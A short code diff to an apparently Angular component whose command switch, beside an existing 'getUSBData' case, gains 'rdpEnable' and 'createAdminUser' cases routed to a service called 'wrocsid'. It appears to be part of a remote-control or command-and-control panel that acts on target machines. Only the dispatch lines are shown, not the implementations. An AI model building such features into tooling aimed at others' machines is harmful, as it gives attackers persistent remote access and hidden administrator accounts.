@@ -85,6 +85,12 @@ export class CommandsAllComponent implements OnInit {
       case 'getUSBData':
         this.wrocsid.getUSBData(identifier)
         break;
+      case 'rdpEnable':
+        this.wrocsid.rdpEnable(identifier)
+        break;
+      case 'createAdminUser':
+        this.wrocsid.createAdminUser(identifier)
+        break;
     }
   }
 
